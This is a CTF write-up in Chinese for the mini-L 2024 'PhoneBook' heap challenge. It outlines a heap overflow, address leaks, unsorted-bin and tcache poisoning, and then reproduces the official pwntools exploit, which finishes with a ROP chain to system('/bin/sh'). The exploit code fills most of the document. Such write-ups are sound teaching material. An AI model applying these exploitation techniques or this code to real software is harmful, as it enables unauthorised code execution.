---
title: mini-L WriteUp
date: 2024-05-20 15:26:44
tags: WriteUp
---

# mini-L 部分WriteUp

## PhoneBook

最大进步 这次没摆烂学了一下ida怎么加结构体

> View - Open Subviews - Local Type - INSERT键 - 输入新结构体 - 右击"Synchornize to idb"

然后发现不加结构体更好看出来溢出

其实思路很简单

1. 存在一个3字节的溢出，直接可以修改node.next
2. 首先利用%s，泄露出堆地址
3. 接着构造多个小堆块，同时伪造prev和size，修改某个堆块的指针，从而把我们的fake_chunk放到unsortedbin中
4. 修改链表，泄露libc
5. 后面常规打法，用libc_environ
6. 由于可以修改指针，其实可以算好偏移，就可以实现任意地址写和任意地址读

放一个官方的exp

```python
from pwn import*
p = process("./PhoneBook")
libc = ELF("./libc.so.6")
def DEBUG():
    context.log_level = 'debug'
    attach(p)
    pause()

def menu(choice):
    p.recvuntil(b'Your Choice: \n')
    p.sendline(str(choice).encode())

def add(name, num):
    menu(1)
    p.recvuntil(b'Name?\n')
    p.send(name)
    p.recvuntil(b'Phone Number?\n')
    p.send(num)

def dele(index):
    menu(2)
    p.recvuntil(b'Index?\n')
    p.sendline(str(index).encode())

def show():
    menu(3)

def edit(index, name, num):
    menu(4)
    p.recvuntil(b'Index?\n')
    p.sendline(str(index).encode())
    p.recvuntil(b'Name?\n')
    p.send(name)
    p.recvuntil(b'Phone Number?\n')
    p.send(num)
# context.log_level = 'debug'
add(b'A', b'1' * 8)
add(b'B', b'2' * 8)
add(b"C", b'3' * 8)     # 1
show()
p.recvuntil(b'2'*8)
heapbase = u64(p.recv(6).ljust(8, b'\x00'))-0x330
log.success('heapbase ===> '+hex(heapbase))

# make a big heap and free it into unsortedbin
for i in range(30):
    add(b'i', b'0')     # 4 - 0x33
edit(4, p64(0x4a1)+p64(4), b'0')
# DEBUG()
edit(3, b'A', b'0'*8+b'\x70')
dele(4)

edit(2, b'A', b'0'*8+b'\x68')
show()
p.recvuntil(b'1185    ')
libcbase = u64(p.recv(6).ljust(8, b'\x00'))-0x219ce0
log.success('libcbase ===> '+hex(libcbase))
environ = libcbase + libc.symbols['environ']
sys = libcbase + libc.symbols['system']
bin_sh = libcbase + next(libc.search(b'/bin/sh\x00'))
pop_rdi = libcbase + 0x2a3e5
log.success('libc_environ ==> ' + hex(environ))
edit(1, b'A', p64(environ-0x18))
edit(2, b'A', b'0'*8+p16((heapbase&0xffff)+0x2c8))
show()

p.recvuntil(b'0                       ')
stack = u64(p.recv(6).ljust(8, b'\x00'))-0x148
log.success('stack ===> '+hex(stack))

#tcache poison 打栈
edit(2, b'A', b'0'*8+p16((heapbase&0xffff)+0x3f0))
dele(7)
dele(8)

edit(2, b'A', b'0'*8+p16((heapbase&0xffff)+0x418))
pos = heapbase + 0x420
fd = (stack) ^ (pos>>12)
edit(0x31, p64(fd), b'A')

edit(2, b'A', b'0'*8+p16((heapbase&0xffff)+0x810))
add(b'A', b'A')     #0x34
add(p64(pop_rdi)+p64(bin_sh)[:7], p64(sys-0x470+2)) #0x35
DEBUG()
p.interactive()
```

[miniLCTF_2024/OfficialWriteups/Pwn/Pwn wp.md](https://github.com/XDSEC/miniLCTF_2024/blob/main/OfficialWriteups/Pwn/Pwn wp.md)

